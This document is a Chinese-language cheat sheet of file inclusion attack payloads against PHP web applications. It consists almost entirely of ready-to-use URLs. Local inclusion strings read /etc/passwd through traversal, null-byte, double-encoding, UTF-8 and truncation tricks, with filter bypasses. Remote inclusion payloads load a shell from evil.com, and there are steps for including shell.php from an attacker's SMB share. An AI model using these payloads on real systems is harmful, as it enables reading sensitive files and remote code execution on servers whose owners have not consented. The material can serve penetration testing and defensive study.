# 文件包含漏洞

### 本地文件包含

```bash
http://example.com/index.php?page=../../../etc/passwd
```

空字节（低于5.3.4）
```bash
http://example.com/index.php?page=../../../etc/passwd%00
```

遍历
```bash
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

双编码
```bash
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

UTF8
```bash
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

路径截断</br>
在大多数 PHP 安装中，长度超过4096字节的文件名将被截断，因此任何多余的字符都将被丢弃
```bash
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

基础过滤绕过
```bash
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### 远程文件包含

PHP5后默认配置不起作用，需要修改配置文件allow_url_include = On

```bash
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

绕过allow_url_include</br>
当allow_url_include和allow_url_fopen被设置为Off时，可以使用smb协议在Windows机器上包含远程文件

+ 1. 创建一个向所有人开放的smb共享
+ 2. 写入一个shell.php文件，其中包含执行的PHP代码
+ 3. 然后文件包含它，有效负载为http://example.com/index.php?page=\\攻击者主机地址\share\shell.php
